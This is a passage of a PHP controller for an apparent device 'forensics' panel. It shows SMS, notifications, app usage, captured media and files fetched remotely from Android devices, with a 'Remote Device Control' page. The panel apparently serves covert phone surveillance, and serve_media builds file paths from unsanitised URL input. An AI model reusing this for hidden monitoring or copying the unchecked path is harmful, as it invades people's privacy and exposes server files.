<?php

namespace App\Controllers\clients;

use CodeIgniter\API\ResponseTrait;

class ForensicsUserController extends BaseClientController
{
    use ResponseTrait;

    private const DETAIL_PER_PAGE = 50;

    private function commonData(string $active, string $title): array
    {
        $counts = $this->getUserDataCounts();
        return array_merge($counts, [
            'pag' => 'advanced',
            'title' => $title,
            'nav_urls' => $this->getAdvancedNavUrls($active, $counts),
            'active_tab' => $active,
        ]);
    }

    /**
     * Navigation tabs shared across all advanced pages.
     */
    private function getAdvancedNavUrls(string $activeView, array $counts = []): string
    {
        $hardware_tabs = [
            // Individual hardware pages
            'device_context', 'network_info', 'bluetooth', 'sensors', 'camera_info',
            'battery_stats', 'processes', 'proc_info', 'cell_towers', 'display_info',
            'storage', 'thermal', 'nfc', 'hardware_graphics', 'hardware_network',
            'audio_devices', 'biometric', 'gnss_hardware', 'power_rails', 'usb_devices',
            'vibration', 'sim_configs',
            // Merged hardware pages
            'hardware_dashboard', 'battery_power', 'system_performance', 'network_connectivity',
            'display_graphics', 'sensors_location', 'media_hardware', 'storage_peripherals',
            'shortrange_auth', 'device_fingerprint', 'hardware_landing'
        ];
        $software_tabs = [
            'accounts', 'calendar', 'app_usage', 'notifications', 'security_audit',
            'accessibility', 'input_methods', 'remote_media', 'data_usage', 'saved_wifi',
            'default_apps', 'alarms', 'app_security', 'network_security', 'telephony_network',
            'system_locale', 'app_permissions', 'browser_history', 'clipboard',
            'content_providers', 'crash_logs', 'digital_wellbeing', 'doze_standby',
            'email', 'health_data', 'keyboard_input', 'keyguard', 'screenshots',
            'screen_state', 'vpn_config', 'running_processes', 'software_landing'
        ];

        $is_hardware = in_array($activeView, $hardware_tabs);
        $is_software = in_array($activeView, $software_tabs);

        $html = '<div class="d-flex justify-content-end flex-wrap mb-3" style="gap: 8px;">';
        $html .= sprintf(
            '<a class="btn btn-sm %s" href="%s"><i class="fas fa-microchip mr-1"></i> Hardware</a>',
            $is_hardware ? 'btn-primary' : 'btn-outline-secondary',
            base_url('advanced/hardware')
        );
        $html .= sprintf(
            '<a class="btn btn-sm %s" href="%s"><i class="fas fa-laptop-code mr-1"></i> Software</a>',
            $is_software ? 'btn-primary' : 'btn-outline-secondary',
            base_url('advanced/software')
        );
        $html .= '</div>';
        return $html;
    }

    private function getTimestampColumn(string $table): string
    {
        return match ($table) {
            'tbl_device_profiles' => 'extraction_timestamp',
            default => 'extracted_at',
        };
    }

    private function getLatestRecord(string $table, int $userId): ?array
    {
        $tsCol = $this->getTimestampColumn($table);
        $db = \Config\Database::connect();
        return $db->table($table)
            ->where('owner_id', $userId)
            ->orderBy($tsCol, 'DESC')
            ->limit(1)
            ->get()
            ->getRowArray();
    }

    private function getMergedHistory(string $mainTable, array $joinTables, int $userId, int $perPage = 50): array
    {
        $db = \Config\Database::connect();
        $page = service('request')->getGet('page') ?? 1;
        $offset = ($page - 1) * $perPage;
        $tsCol = $this->getTimestampColumn($mainTable);

        $timestamps = $db->table("{$mainTable} m")
            ->where('owner_id', $userId)
            ->select("DISTINCT {$tsCol}", false)
            ->orderBy($tsCol, 'DESC')
            ->limit($perPage, $offset)
            ->get()
            ->getResultArray();

        if (empty($timestamps)) {
            return [];
        }

        $tsList = array_column($timestamps, $tsCol);
        $results = [];
        foreach ($tsList as $ts) {
            $row = ['extracted_at' => $ts];
            foreach ($joinTables as $alias => $table) {
                $joinTsCol = $this->getTimestampColumn($table);
                $record = $db->table("{$table} {$alias}")
                    ->where('owner_id', $userId)
                    ->where("{$joinTsCol} <=", $ts)
                    ->orderBy($joinTsCol, 'DESC')
                    ->limit(1)
                    ->get()
                    ->getRowArray();
                $row[$alias] = $record ?: [];
            }
            $results[] = $row;
        }

        return $results;
    }

    private function getMergedHistoryCount(string $mainTable, int $userId): int
    {
        $db = \Config\Database::connect();
        return (int) $db->table($mainTable)
            ->where('owner_id', $userId)
            ->countAllResults();
    }

    /**
     * Decode a URL segment back to a plain package/group name.
     * Segment is simply urlencode()'d — e.g. com.twitter.android stays as-is.
     */
    private function decodePackageSegment(string $segment): ?string
    {
        if ($segment === '') {
            return null;
        }

        $decoded = urldecode($segment);

        return ($decoded !== '') ? $decoded : null;
    }

    /**
     * Encode a package/group name for safe use in a URL segment.
     * urlencode() percent-encodes special chars; dots and letters pass through unchanged.
     */
    private function encodePackageSegment(string $value): string
    {
        return urlencode($value);
    }

    private function formatMsDatetime($msTimestamp, string $format = 'Y-m-d H:i:s'): string
    {
        if ($msTimestamp === null || $msTimestamp === '' || (int) $msTimestamp === 0) {
            return '—';
        }

        return date($format, (int) floor((int) $msTimestamp / 1000));
    }

    private function formatRelativeTime($msTimestamp): string
    {
        if ($msTimestamp === null || $msTimestamp === '' || (int) $msTimestamp === 0) {
            return '—';
        }

        $seconds = (int) floor((int) $msTimestamp / 1000);
        $diff = time() - $seconds;

        if ($diff < 60) {
            return 'just now';
        }
        if ($diff < 3600) {
            return (int) floor($diff / 60) . ' min ago';
        }
        if ($diff < 86400) {
            return (int) floor($diff / 3600) . ' h ago';
        }
        if ($diff < 604800) {
            return (int) floor($diff / 86400) . ' d ago';
        }

        return date('Y-m-d H:i', $seconds);
    }

    private function enrichAppUsageGroupedRows(array $rows): array
    {
        foreach ($rows as &$row) {
            $row['last_used_display'] = $this->formatMsDatetime($row['last_time_used'] ?? null, 'M d, Y, l H:i');
            // urlencode: com.twitter.android → com.twitter.android (dots are safe, no change)
            $row['package_url_enc'] = urlencode((string) ($row['package_name'] ?? ''));
        }

        return $rows;
    }

    private function enrichNotificationGroupedRows(array $rows): array
    {
        foreach ($rows as &$row) {
            $ts = $row['latest_timestamp'] ?? null;
            $row['latest_ts_abs'] = $this->formatMsDatetime($ts, 'M d, Y, l H:i');
            $row['latest_ts_rel'] = $this->formatRelativeTime($ts);
            // urlencode: com.twitter.android → com.twitter.android (dots are safe, no change)
            $row['group_url_enc'] = urlencode((string) ($row['group_key'] ?? ''));
            $row['latest_title_short'] = mb_strimwidth($row['latest_title'] ?? '—', 0, 60, '…');
        }

        return $rows;
    }

    /**
     * Compute total background time per app_usage_id from session events.
     *
     * Pairs consecutive session events: background time is accumulated
     * between a 'paused'/'closed' event and the next 'opened' event.
     *
     * @param array $sessions Enriched session rows (must contain app_usage_id, event_type, timestamp)
     * @return array<int, int> Map of app_usage_id → total background time in ms
     */
    private function computeBackgroundTimeFromSessions(array $sessions): array
    {
        // Group sessions by app_usage_id
        $grouped = [];
        foreach ($sessions as $s) {
            $id = (int) ($s['app_usage_id'] ?? 0);
            if ($id <= 0) continue;
            $grouped[$id][] = $s;
        }

        $bgMap = [];
        foreach ($grouped as $id => $events) {
            // Sort by timestamp ascending
            usort($events, fn($a, $b) => ((int)($a['timestamp'] ?? 0)) <=> ((int)($b['timestamp'] ?? 0)));

            $bgMs = 0;
            $lastBgEventTs = null; // Timestamp of last 'paused' or 'closed'
            foreach ($events as $ev) {
                $type = strtolower($ev['event_type'] ?? '');
                $ts   = (int) ($ev['timestamp'] ?? 0);
                if ($ts <= 0) continue;

                if (in_array($type, ['paused', 'closed'])) {
                    $lastBgEventTs = $ts;
                } elseif ($type === 'opened' && $lastBgEventTs !== null) {
                    $bgMs += ($ts - $lastBgEventTs);
                    $lastBgEventTs = null;
                }
            }
            if ($bgMs > 0) {
                $bgMap[$id] = $bgMs;
            }
        }

        return $bgMap;
    }

    private function enrichAppUsageDetailRows(array $rows, array $bgTimeMap = []): array
    {
        $count = count($rows);
        for ($i = 0; $i < $count; $i++) {
            $rows[$i]['last_used_display'] = $this->formatMsDatetime($rows[$i]['last_time_used'] ?? null, 'M d, Y, l H:i');
            $rows[$i]['extracted_display'] = $this->formatMsDatetime($rows[$i]['extracted_at'] ?? null, 'M d, Y, l H:i');

            $bgFromSessions = $bgTimeMap[(int)($rows[$i]['id'] ?? 0)] ?? 0;

            if ($i < $count - 1) {
                $currentFg = (int) ($rows[$i]['foreground_time_ms'] ?? 0);
                $prevFg    = (int) ($rows[$i + 1]['foreground_time_ms'] ?? 0);
                $fgDelta   = $currentFg - $prevFg;
                if ($fgDelta < 0) $fgDelta = $currentFg;

                $rows[$i]['time_taken_ms'] = $fgDelta;

                $currentExt = (int) ($rows[$i]['extracted_at'] ?? 0);
                $prevExt    = (int) ($rows[$i + 1]['extracted_at'] ?? 0);

                // Use absolute wall-clock delta regardless of row order
                if ($currentExt > 0 && $prevExt > 0) {
                    $wallDelta = abs($currentExt - $prevExt);
                    $rows[$i]['background_time_ms'] = max(0, $wallDelta - $fgDelta);
                } else {
                    $rows[$i]['background_time_ms'] = $bgFromSessions;
                }
            } else {
                $rows[$i]['time_taken_ms'] = null;
                $rows[$i]['background_time_ms'] = $bgFromSessions;
            }
        }

        return $rows;
    }

    private function enrichAppUsageSessions(array $sessions): array
    {
        foreach ($sessions as &$row) {
            $row['timestamp_display'] = $this->formatMsDatetime($row['timestamp'] ?? null, 'M d, Y, l H:i');
        }

        return $sessions;
    }

    private function enrichNotificationDetailRows(array $rows): array
    {
        foreach ($rows as &$row) {
            $ts = $row['notification_timestamp'] ?? null;
            $row['ts_abs'] = $this->formatMsDatetime($ts, 'M d, Y, l H:i');
            $row['ts_rel'] = $this->formatRelativeTime($ts);
        }

        return $rows;
    }

    /** GET /advanced/accounts */
    public function accounts()
    {
        $builder = $this->finderModel->getAccountsQuery($this->userId);
        [$rows, $pager, $total] = $this->paginate($builder, 25);

        $data = array_merge($this->commonData('accounts', 'Accounts'), [
            'rows'     => $rows,
            'total'    => $total,
            'pager'    => $pager,
        ]);

        return $this->renderAppView('users/advanced/accounts', $data);
    }

    /** POST /advanced/accounts/delete/(:num) */
    public function delete_accounts_row($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_accounts_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /analysis/advanced_timeline */
    public function timeline()
    {
        $events = $this->finderModel->get_timeline_events($this->userId, 50);

        // Enrich events (e.g. decode SMS)
        foreach ($events as &$ev) {
            if ($ev['event_type'] === 'sms' && !empty($ev['meta2'])) {
                $ev['meta2'] = base64_decode($ev['meta2']);
            }
        }

        $total = $this->finderModel->get_count_timeline_events($this->userId);

        $data = array_merge($this->commonData('timeline', 'Device Timeline'), [
            'events' => $events,
            'total' => $total,
            'pager' => $this->finderModel->getPager(),
            'pag' => 'timeline', // Ensure sidebar makes Timeline active!
        ]);

        return $this->renderAppView('users/advanced/timeline', $data);
    }

    /** GET /advanced/calendar */
    public function calendar()
    {
        $data = array_merge($this->commonData('calendar', 'Calendar Events'), [
            'rows' => $this->finderModel->get_calendar_events($this->userId),
            'total' => $this->finderModel->get_count_Calendar($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/calendar', $data);
    }

    /** POST /advanced/calendar/delete/(:num) */
    public function delete_calendar_event($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_calendar_event((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Event deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete event.']);
    }

    /** GET /advanced/app-usage */
    public function app_usage()
    {
        $rows = $this->enrichAppUsageGroupedRows(
            $this->finderModel->get_app_usage_grouped($this->userId, self::DETAIL_PER_PAGE)
        );

        $data = array_merge($this->commonData('app_usage', 'App Usage'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_app_usage_packages($this->userId),
            'total_snapshots' => $this->finderModel->get_count_AppUsage($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);

        return $this->renderAppView('users/advanced/app_usage', $data);
    }

    /** GET /advanced/app-usage/{package} */
    public function app_usage_detail(string $encodedPkg)
    {
        $packageName = $this->decodePackageSegment($encodedPkg);
        if ($packageName === null) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $summary = $this->finderModel->get_app_usage_package_summary($this->userId, $packageName);
        if (empty($summary)) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $sessions = $this->enrichAppUsageSessions(
            $this->finderModel->get_app_usage_sessions_for_package(
                $this->userId,
                $packageName,
                self::DETAIL_PER_PAGE
            )
        );

        // Build background_time map from session events per app_usage_id
        $bgTimeMap = $this->computeBackgroundTimeFromSessions($sessions);

        $summary['last_used_display'] = $this->formatMsDatetime($summary['last_time_used'] ?? null, 'M d, Y, l H:i');

        $appDetail = $this->finderModel->get_app_detail_by_package($this->userId, $packageName);

        $data = array_merge($this->commonData('app_usage', 'App Usage — ' . ($summary['app_name'] ?? $packageName)), [
            'rows' => $this->enrichAppUsageDetailRows(
                $this->finderModel->get_app_usage_for_package($this->userId, $packageName, self::DETAIL_PER_PAGE),
                $bgTimeMap
            ),
            'total' => $this->finderModel->get_count_app_usage_for_package($this->userId, $packageName),
            'pager' => $this->finderModel->getPager(),
            'package_name' => $packageName,
            'summary' => $summary,
            'app_detail' => $appDetail,
            'sessions' => $sessions,
            'back_url' => base_url('advanced/software/app-usage'),
            'encoded_pkg' => $encodedPkg,
            'nav_urls' => '',
        ]);

        $data['detail_mode'] = true;

        return $this->renderAppView('users/advanced/app_usage_detail', $data);
    }

    /** POST /advanced/app-usage/delete/(:num) */
    public function delete_app_usage($id)
    {
        if ($this->finderModel->delete_app_usage((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'App usage snapshot deleted.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete snapshot.']);
    }

    /** POST /advanced/app-usage/delete-package/(:any) */
    public function delete_app_usage_by_package($encodedPkg)
    {
        $packageName = $this->decodePackageSegment($encodedPkg);
        if ($packageName === null) {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid package name.']);
        }
        if ($this->finderModel->delete_app_usage_by_package($this->userId, $packageName)) {
            return $this->response->setJSON(['success' => true, 'message' => 'All usage data for this app has been deleted.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete usage data.']);
    }

    /** GET /advanced/notifications */
    public function notifications()
    {
        $rows = $this->enrichNotificationGroupedRows(
            $this->finderModel->get_notifications_grouped($this->userId, self::DETAIL_PER_PAGE)
        );

        $data = array_merge($this->commonData('notifications', 'Notifications'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_notification_groups($this->userId),
            'total_notifications' => $this->finderModel->get_count_Notifications($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);

        return $this->renderAppView('users/advanced/notifications', $data);
    }

    /** GET /advanced/notifications/{group} */
    public function notification_detail(string $encodedPkg)
    {
        $groupKey = $this->decodePackageSegment($encodedPkg);
        if ($groupKey === null) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $summary = $this->finderModel->get_notifications_group_summary($this->userId, $groupKey);
        if (empty($summary)) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $summary['latest_ts_abs'] = $this->formatMsDatetime($summary['latest_timestamp'] ?? null, 'M d, Y, l H:i');
        $summary['latest_ts_rel'] = $this->formatRelativeTime($summary['latest_timestamp'] ?? null);

        $appDetail = $this->finderModel->get_app_detail_by_package($this->userId, $groupKey);

        $data = array_merge($this->commonData('notifications', 'Notifications — ' . ($summary['display_name'] ?? $groupKey)), [
            'rows' => $this->enrichNotificationDetailRows(
                $this->finderModel->get_notifications_for_group($this->userId, $groupKey, self::DETAIL_PER_PAGE)
            ),
            'total' => $this->finderModel->get_count_notifications_for_group($this->userId, $groupKey),
            'pager' => $this->finderModel->getPager(),
            'group_key' => $groupKey,
            'summary' => $summary,
            'app_detail' => $appDetail,
            'back_url' => base_url('advanced/software/notifications'),
            'encoded_pkg' => $encodedPkg,
            'nav_urls' => '',
        ]);

        $data['detail_mode'] = true;

        return $this->renderAppView('users/advanced/notification_detail', $data);
    }

    /** POST /advanced/notifications/delete-row/(:num) */
    public function delete_notification_row($id)
    {
        if ($this->finderModel->delete_notification((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Notification deleted.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete notification.']);
    }

    /** POST /advanced/notifications/delete/(:any) */
    public function delete_notifications_by_app($pkgEnc = null)
    {
        // Support both route segment and POST data
        if ($pkgEnc === null) {
            $pkgEnc = $this->request->getPost('pkg') ?? $this->request->uri->getSegment(5);
        }
        $packageName = $this->decodePackageSegment($pkgEnc);
        if (!$packageName) {
            if ($this->request->isAJAX()) {
                return $this->response->setJSON(['success' => false, 'message' => 'Invalid package name']);
            }
            $this->session->setFlashdata('error', 'Invalid package name');
            return redirect()->to(base_url('advanced/software/notifications'));
        }
        if ($this->finderModel->delete_notifications_by_app($this->userId, $packageName)) {
            if ($this->request->isAJAX()) {
                return $this->response->setJSON(['success' => true, 'message' => 'All notifications for the app have been deleted']);
            }
            $this->session->setFlashdata('success', 'All notifications for the app have been deleted');
            return redirect()->to(base_url('advanced/software/notifications'));
        }
        if ($this->request->isAJAX()) {
            return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete notifications for the app']);
        }
        $this->session->setFlashdata('error', 'Failed to delete notifications for the app');
        return redirect()->to(base_url('advanced/software/notifications'));
    }

    /** GET /advanced/security_audit */
    public function security_audit()
    {
        $rows = $this->finderModel->get_security_audit($this->userId);
        foreach ($rows as &$r) {
            $r['ts_display'] = !empty($r['extracted_at']) ? format_timestamp_display((int)$r['extracted_at']) : '—';
        }
        unset($r);
        $data = array_merge($this->commonData('security_audit', 'Security Audit'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_SecurityAudit($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/security_audit', $data);
    }

    /** POST /advanced/security_audit/delete/(:num) */
    public function delete_security_audit_row($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_security_audit_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /remote-device */
    public function remote_device()
    {
        $userModel = new \App\Models\UserModel();
        $devices = $userModel->get_user_devices_from_profile($this->userId);

        $targetDevice = null;
        $deviceIds = array_column($devices, 'device_id');

        if (!empty($deviceIds)) {
            $db = \Config\Database::connect();
            $targetDevice = $db->table('tbl_device_profiles')
                ->whereIn('device_id', $deviceIds)
                ->where('fcm_token !=', '')
                ->where('fcm_token IS NOT NULL')
                ->orderBy('counter', 'DESC') // Bottom-most record in the table
                ->get()
                ->getRowArray();
        }

        $recentUploadSources = [];
        if ($targetDevice) {
            $db = \Config\Database::connect();
            $recentUploadSources = $db->table('tbl_uploaded_files')
                ->select('upload_source, COUNT(*) as count')
                ->where('token_owner_id', $this->userId)
                ->where('uploaded_at >= DATE_SUB(NOW(), INTERVAL 7 DAY)')
                ->groupBy('upload_source')
                ->get()
                ->getResultArray();
        }

        $downloadedMedia = [];
        if ($targetDevice) {
            $db = \Config\Database::connect();
            
            // 1. Fetch captured media
            $mediaRows = $db->table('tbl_extracted_media_files m')
                ->select('m.id, m.media_type, m.stored_filename, m.file_size, m.mime_type, m.created_at, u.original_filename as raw_upload_name')
                ->join('tbl_uploaded_files u', 'm.file_record_id = u.file_id', 'left')
                ->where('m.owner_id', $this->userId)
                ->orderBy('m.created_at', 'DESC')
                ->limit(50)
                ->get()
                ->getResultArray();

            foreach ($mediaRows as $r) {
                $originalName = $r['raw_upload_name'] ?: $r['stored_filename'];
                if (str_ends_with(strtolower($originalName), '.enc')) {
                    $originalName = substr($originalName, 0, -4);
                }
                
                $downloadedMedia[] = [
                    'id' => $r['id'],
                    'source' => 'media',
                    'type' => $r['media_type'], // image or audio
                    'original_filename' => $originalName,
                    'stored_filename' => $r['stored_filename'],
                    'file_size' => $r['file_size'],
                    'mime_type' => $r['mime_type'],
                    'created_at' => $r['created_at'],
                ];
            }

            // 2. Fetch generic downloaded files (category = 'files')
            $fileRows = $db->table('tbl_uploaded_files')
                ->where('token_owner_id', $this->userId)
                ->where('file_category', 'files')
                ->orderBy('uploaded_at', 'DESC')
                ->limit(50)
                ->get()
                ->getResultArray();

            foreach ($fileRows as $r) {
                $originalName = $r['original_filename'];
                if (str_ends_with(strtolower($originalName), '.enc')) {
                    $originalName = substr($originalName, 0, -4);
                }
                
                // Skip if it looks like a JSON list (e.g., file hierarchy sync)
                if (str_ends_with(strtolower($originalName), '.json') || $r['mime_type'] === 'application/json') {
                    continue;
                }

                // Resolve original Android path from tbl_user_actions
                $androidPath = '';
                $actionLog = $db->table('tbl_user_actions')
                    ->where('user_id', $this->userId)
                    ->where('action_type', 'fetch_file')
                    ->like('new_values', $originalName)
                    ->orderBy('id', 'DESC')
                    ->get()
                    ->getRowArray();

                if ($actionLog) {
                    $newVals = json_decode($actionLog['new_values'], true);
                    $fullPath = $newVals['payload'] ?? '';
                    if ($fullPath) {
                        $androidPath = dirname($fullPath);
                        if ($androidPath !== '.' && $androidPath !== '/') {
                            $androidPath = rtrim($androidPath, '/') . '/';
                        } else {
                            $androidPath = '';
                        }
                    }
                }

                $downloadedMedia[] = [
                    'id' => $r['file_id'],
                    'source' => 'upload',
                    'type' => 'file',
                    'original_filename' => $originalName,
                    'stored_filename' => $r['stored_filename'],
                    'file_size' => $r['file_size_bytes'],
                    'mime_type' => $r['mime_type'],
                    'created_at' => $r['uploaded_at'],
                    'android_path' => $androidPath,
                ];
            }

            // Sort merged downloadedMedia list by created_at DESC
            usort($downloadedMedia, function($a, $b) {
                return strcmp($b['created_at'], $a['created_at']);
            });
        }

        $counts = $this->getUserDataCounts();
        $data = array_merge($counts, [
            'pag' => 'remote_device',
            'title' => 'Remote Device Control',
            'targetDevice' => $targetDevice,
            'recentUploadSources' => $recentUploadSources,
            'downloadedMedia' => $downloadedMedia,
        ]);

        return $this->renderAppView('users/advanced/remote_device', $data);
    }

    /** GET /advanced/media */
    public function remote_media()
    {
        [$rows, $pager, $total] = $this->paginate(
            $this->finderModel->tableQuery('tbl_extracted_media_files', $this->userId, 'created_at', 'DESC')
        );

        foreach ($rows as &$r) {
            $r['created_at_display'] = isset($r['created_at'])
                ? date('M d, Y, H:i (l)', strtotime($r['created_at']))
                : '—';
        }
        unset($r);

        $data = array_merge($this->commonData('remote_media', 'Remote Media Forensic'), [
            'rows' => $rows,
            'total' => $total,
            'pager' => $pager,
        ]);
        return $this->renderAppView('users/advanced/remote_media', $data);
    }
    /** GET /advanced/media/serve/(:any) */
    public function serve_media($filename)
    {
        $path = WRITEPATH . 'uploads/captured/' . $filename;
        if (!file_exists($path)) {
            $path = WRITEPATH . 'uploads/audio/' . $filename;
        }

        $db = \Config\Database::connect();

        if (!file_exists($path)) {
            // Check if it's in text_dump (encrypted file)
            $path = WRITEPATH . 'uploads/text_dump/' . $filename;
            if (file_exists($path)) {
                $fileRecord = $db->table('tbl_uploaded_files')
                    ->where('stored_filename', $filename)
                    ->get()
                    ->getRowArray();

                if ($fileRecord) {
                    $cryptModel = new \App\Models\CryptModel();
                    $raw = file_get_contents($path);
                    $decoded = $cryptModel->decrypt_media($raw);
                    if ($decoded !== false) {
                        $mimeType = $fileRecord['mime_type'] ?: 'application/octet-stream';
                        $originalName = $fileRecord['original_filename'];
                        if (str_ends_with(strtolower($originalName), '.enc')) {
                            $originalName = substr($originalName, 0, -4);
                        }

                        $safeMimeTypes = [
                            'image/jpeg', 'image/png', 'image/gif', 'image/webp', 'application/pdf'
                        ];
                        $disposition = in_array($mimeType, $safeMimeTypes, true) ? 'inline' : 'attachment';

                        return $this->response
                            ->setHeader('Content-Type', $mimeType)
                            ->setHeader('Content-Disposition', $disposition . '; filename="' . basename($originalName) . '"')
                            ->setHeader('X-Content-Type-Options', 'nosniff')
                            ->setHeader('Content-Security-Policy', "default-src 'none'; sandbox;")
                            ->setHeader('X-Frame-Options', 'DENY')
                            ->setBody($decoded);
                    }
                }
            }
            
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $mimeType = mime_content_type($path);
        
        // Find the original filename to serve it with the proper name!
        $mediaRecord = $db->table('tbl_extracted_media_files m')
            ->select('m.original_filename as media_orig, u.original_filename as upload_orig')
            ->join('tbl_uploaded_files u', 'm.file_record_id = u.file_id', 'left')
            ->where('m.stored_filename', $filename)
            ->get()
            ->getRowArray();

        $originalName = $filename;
        if ($mediaRecord) {
            $originalName = $mediaRecord['upload_orig'] ?: $mediaRecord['media_orig'];
            if (str_ends_with(strtolower($originalName), '.enc')) {
                $originalName = substr($originalName, 0, -4);
            }
        }

        $safeMimeTypes = [
            'image/jpeg',
            'image/png',
            'image/gif',
            'image/webp',
            'application/pdf'
        ];

        $disposition = in_array($mimeType, $safeMimeTypes, true) ? 'inline' : 'attachment';

        return $this->response
            ->setHeader('Content-Type', $mimeType)
            ->setHeader('Content-Disposition', $disposition . '; filename="' . basename($originalName) . '"')
            ->setHeader('X-Content-Type-Options', 'nosniff')
            ->setHeader('Content-Security-Policy', "default-src 'none'; sandbox;")
            ->setHeader('X-Frame-Options', 'DENY')
            ->setBody(file_get_contents($path));
    }

    /** POST /advanced/media/delete/(:num) */
    public function delete_media($id)
    {
        $source = $this->request->getGet('source') ?? 'media';

        if ($source === 'upload') {
            $db = \Config\Database::connect();
            $file = $db->table('tbl_uploaded_files')
                ->where('file_id', $id)
                ->where('token_owner_id', $this->userId)
                ->get()
                ->getRowArray();

            if (!$file) {
                return $this->failNotFound('File record not found');
            }

            $path = WRITEPATH . 'uploads/text_dump/' . $file['stored_filename'];
            if (file_exists($path)) {
                @unlink($path);
            }

            $db->table('tbl_uploaded_files')
                ->where('file_id', $id)
                ->delete();

            return $this->respondDeleted(['success' => true, 'message' => 'File deleted successfully']);
        }

        $media = $this->finderModel->get_captured_media_by_id($id, $this->userId);
        if (!$media) {
            return $this->failNotFound('Media record not found');
        }

        // Delete physical file
        $path = WRITEPATH . 'uploads/captured/' . $media['stored_filename'];
        if (!file_exists($path)) {
            $path = WRITEPATH . 'uploads/audio/' . $media['stored_filename'];
        }

        if (file_exists($path)) {
            @unlink($path);
        }

        // Delete database record
        if ($this->finderModel->delete_captured_media($id, $this->userId)) {
            return $this->respondDeleted(['success' => true, 'message' => 'Media deleted successfully']);
        }

        return $this->fail('Failed to delete media record');
    }

    /** GET /advanced/camera_info */
    public function camera_info()
    {
        $data = array_merge($this->commonData('camera_info', 'Camera Info'), [
            'rows' => $this->finderModel->get_camera_info($this->userId),
            'total' => $this->finderModel->get_count_CameraInfo($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/camera_info', $data);
    }

    /** POST /advanced/camera_info/delete/(:num) */
    public function delete_camera_info($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_camera_info_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/accessibility */
    public function accessibility()
    {
        $data = array_merge($this->commonData('accessibility', 'Accessibility Services'), [
            'rows' => $this->finderModel->get_accessibility($this->userId),
            'total' => $this->finderModel->get_count_Accessibility($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/accessibility', $data);
    }

    /** POST /advanced/accessibility/delete/(:num) */
    public function delete_accessibility($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_accessibility_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/input_methods */
    public function input_methods()
    {
        $data = array_merge($this->commonData('input_methods', 'Input Methods (IMEs)'), [
            'rows' => $this->finderModel->get_input_methods($this->userId),
            'total' => $this->finderModel->get_count_InputMethods($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/input_methods', $data);
    }

    /** POST /advanced/input_methods/delete/(:num) */
    public function delete_input_methods($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_input_methods_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/default_apps */
    public function default_apps()
    {
        $data = array_merge($this->commonData('default_apps', 'Default Apps'), [
            'rows' => $this->finderModel->get_default_apps($this->userId),
            'total' => $this->finderModel->get_count_DefaultApps($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/default_apps', $data);
    }

    /** POST /advanced/software/default_apps/delete/(:num) */
    public function delete_default_apps($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
